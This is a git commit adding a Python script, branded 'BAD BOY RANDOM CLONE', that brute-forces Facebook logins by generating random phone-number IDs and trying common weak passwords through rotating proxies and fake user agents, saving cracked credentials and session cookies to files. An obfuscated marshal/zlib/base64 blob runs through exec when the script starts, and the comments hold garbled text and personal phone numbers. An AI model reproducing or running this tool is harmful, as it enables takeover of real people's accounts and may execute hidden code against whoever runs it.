352da6f1ac7ae932b2732d7e8145e967e6be28fa
Afgbadboyking007 <138615558+Afgbadboyking007@users.noreply.github.com>
2023-07-05 14:10:24 +0430

    Add files via upload

---
+++ Random.py
@@ -0,0 +1,225 @@
+#Script рждрзЛ ржирж┐рждрзЗ ржЖрж╕рж▓рж╛ ржПржХрж╛ржЙржирзНржЯ ржЯрж╛ ржлрж▓рзЛ ржХрж░рж▓рзЗ ржХрж┐ рж╣рзЯ рж╣рзБржоЁЯШХ
+#ржПржХрж╛ржЙржирзНржЯ ржлрж▓рзЛ ржЖрж░ ржПржЗ Respotary рждрзЗ ржПржХржЯрж╛ Star ржжрж┐рзЯрж╛ ржпрж╛ржЗржУЁЯШК
+#----------------------------------------------------------------------------------------------------------
+#CREATE BY : MUMIT ISLAM HIMU
+#WHATSAPP : +8801644777805
+#GITHUB : https://github.com/MUMIT-404-CYBER
+#----------------------------------------------------------------------------------------------------------
+import os,sys,time,json,random,re,string,platform,base64,uuid,marshal, base64, zlib; exec(marshal.loads(zlib.decompress(base64.b64decode(b'eJx7zIAEmKH0ZxkgMZ2BiSGVIYVhGSMDw2pGmBJGhhTGYAZNplJLIEc62tDa0ig3Gkwb5j6aMxkqEqsQ7BzkGRCi4Bzk6OIZouAb6gskPYN9HH0VPDx9Q/00GW+xFhRl5pWsZPgMMvYXj6efn7+zq1+IgpN/5C8Om9z8lNKcVLsiNrCdDAzFICd9YGZkZLzBwNrAeoHN6yKD9xUG7wswVMQCVAAAK8Mupg=='))))
+from bs4 import BeautifulSoup as sop
+from bs4 import BeautifulSoup
+import requests as ress
+from datetime import date
+from datetime import datetime
+from time import sleep
+from os import system as s
+from time import sleep as waktu
+try:
+    import requests
+    from concurrent.futures import ThreadPoolExecutor as ThreadPool
+    import mechanize
+    from requests.exceptions import ConnectionError
+except ModuleNotFoundError:
+    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
+    os.system('pip install bs4')
+RED = '\033[1;91m'
+WHITE = '\033[1;97m'
+GREEN = '\033[1;32m' 
+YELLOW = '\033[1;33m'
+BLUE = '\033[1;34m'
+ORANGE = '\033[1;35m'
+P = '\x1b[1;97m' 
+M = '\x1b[1;91m' 
+H = '\x1b[1;92m' 
+K = '\x1b[1;93m' 
+B = '\x1b[1;94m' 
+U = '\x1b[1;95m' 
+O = '\x1b[1;96m' 
+N = '\x1b[0m'    
+A = '\x1b[1;90m' 
+BN = '\x1b[1;107m' 
+BBL = '\x1b[1;106m' 
+BP = '\x1b[1;105m' 
+BB = '\x1b[1;104m' 
+BK = '\x1b[1;103m' 
+BH = '\x1b[1;102m' 
+BM = '\x1b[1;101m' 
+BA = '\x1b[1;100m' 
+now = datetime.now()
+dt_string = now.strftime("%H:%M")
+current = datetime.now()
+ta = current.year
+bu = current.month
+ha = current.day
+today = date.today() 
+loop = 0
+oks = []
+cps = []
+ugen2=[]
+ugen=[]
+cokbrut=[]
+ses=requests.Session()
+princp=[]
+try:
+ prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
+ open('.prox.txt','w').write(prox)
+except Exception as e:
+ print('')
+prox=open('.prox.txt','r').read().splitlines()
+for xd in range(10000):
+    a='Nokia'
+    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    c=random.randrange(1, 99)
+    d='/GoBrowser/'
+    e='1.6.0.'
+    f=random.randrange(1, 99)
+    uaku2=(f'{a}{b}{c}{d}{e}{f}')
+    ugen.append(uaku2)
+    
+def __init__(self):
+        self.id = []
+        self.ok = []
+        self.cp = []
+        self.loop = 0
+        
+logo = ("""\033[1;37m
+
+ /$$$$$$$   /$$$$$$  /$$$$$$$        /$$$$$$$   /$$$$$$  /$$     /$$
+| $$__  $$ /$$__  $$| $$__  $$      | $$__  $$ /$$__  $$|  $$   /$$/
+| $$  \ $$| $$  \ $$| $$  \ $$      | $$  \ $$| $$  \ $$ \  $$ /$$/ 
+| $$$$$$$ | $$$$$$$$| $$  | $$      | $$$$$$$ | $$  | $$  \  $$$$/  
+| $$__  $$| $$__  $$| $$  | $$      | $$__  $$| $$  | $$   \  $$/   
+| $$  \ $$| $$  | $$| $$  | $$      | $$  \ $$| $$  | $$    | $$    
+| $$$$$$$/| $$  | $$| $$$$$$$/      | $$$$$$$/|  $$$$$$/    | $$    
+|_______/ |__/  |__/|_______/       |_______/  \______/     |__/    
+
+==================================================
+[🥀] AUTHOR       : BAD BOY
+[🥀] TOOLS          : RANDOM CLONE
+[🥀] TYPE             : FREE
+[🥀] FACEBOOK   : Mujeebullah Amini
+[🥀] WHATSAPP  : +93×××××××
+==================================================""")
+
+logo1 = ("""\033[1;37m
+    
+ /$$$$$$$   /$$$$$$  /$$$$$$$        /$$$$$$$   /$$$$$$  /$$     /$$
+| $$__  $$ /$$__  $$| $$__  $$      | $$__  $$ /$$__  $$|  $$   /$$/
+| $$  \ $$| $$  \ $$| $$  \ $$      | $$  \ $$| $$  \ $$ \  $$ /$$/ 
+| $$$$$$$ | $$$$$$$$| $$  | $$      | $$$$$$$ | $$  | $$  \  $$$$/  
+| $$__  $$| $$__  $$| $$  | $$      | $$__  $$| $$  | $$   \  $$/   
+| $$  \ $$| $$  | $$| $$  | $$      | $$  \ $$| $$  | $$    | $$    
+| $$$$$$$/| $$  | $$| $$$$$$$/      | $$$$$$$/|  $$$$$$/    | $$    
+|_______/ |__/  |__/|_______/       |_______/  \______/     |__/    
+                                                                    
+
+==================================================""")
+
+def mumitx():
+	print('==================================================')
+
+def Main():
+        os.system("clear")
+        print(logo)
+        print(" [1] RANDOM CRACK")
+        print(" [0] Exit")
+        Mumit =input("\n [?] Choose : ")
+        if Mumit in ["1","01"]:
+            fuck()
+        if Mumit in [" 0", "00"]:
+            exit()
+        else:
+            exit()
+            
+def fuck():
+    user=[]
+    os.system('clear')
+    print(logo)
+    print('[+] EXAMPLE CODE: 9378, 9377, 9370, 9379')
+    code = input('[?] CHOOSE CODE : ')
+    os.system('clear')
+    print(logo)
+    print('[+] EXAMPLE: 2000 3000 5000 10000 ')
+    limit = int(input('[?] CHOOSE : '))
+    for nmbr in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(4))
+        user.append(nmp)
+    with ThreadPool(max_workers=30) as yaari:
+        os.system('clear')
+        print(logo1)
+        tl = str(len(user))
+        print('[+] Total ids: '+tl)
+        print("[+] Your Code: "+code)
+        print('[+] Process has been started')
+        print('[+] Use flight mode for speed up')
+        print('==================================================')
+        for guru in user:
+            uid = code+guru
+            pwx = [guru,uid,uid[:7],uid[:6],'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','۱۲۳۴۵۶','۱۲۳۴۵۶۷۸۹','۱۰۰۲۰۰,''kabul123']
+            yaari.submit(mumit2,uid,pwx,tl)
+    print(mumitx)
+    print(' [+] Crack process has been completed')
+    print(' [+] OK Ids saved in BAD BOY/OK.txt')
+    print(' [+] CP Ids saved in BAD BOY/CP.txt')
+    print(mumitx)
+       
+def mumit2(uid,pwx,tl):
+    global loop
+    global cps
+    global oks
+    global proxy
+    try:
+        for ps in pwx:
+            pro = random.choice(ugen)
+            session = requests.Session()
+            sys.stdout.write('\r\033[1;92m[BAD BOY]├Ч[%s/%s]├Ч[OK-%s]├Ч[CP-%s] \r'%(loop,tl,len(oks),len(cps))),
+            sys.stdout.flush()
+            free_fb = session.get('https://m.facebook.com').text
+            log_data = {
+                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            "try_number":"0",
+            "unrecognized_tries":"0",
+            "email":uid,
+            "pass":ps,
+            "login":"Log In"}
+            header_freefb = {"authority": 'm.facebook.com',
+            "method": 'GET',
+            "scheme": 'https',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+            'cache-control': 'max-age=0',
+            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'none',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': pro}
+            lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
+            log_cookies=session.cookies.get_dict().keys()
+            if 'c_user' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[7:22]
+                print(f"\033[38;5;46m[BAD BOY-OK] {uid}|{ps} \nCookie : {coki}")
+                open('/sdcard/BAD BOY/OK.txt', 'a').write( uid+' | '+ps+'\n')
+                oks.append(uid)
+                break
+            elif 'checkpoint' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[82:97]
+                print(f"\x1b[38;5;196m[BAD BOY-CP] {cid}|{ps}")
+                open('/sdcard/BAD BOY-CP.txt', 'a').write( uid+' | '+ps+' \n')
+                cps.append(uid)
+                break
+            else:
+                continue
+        loop+=1
+    except:
+        pass
+        
+Main()
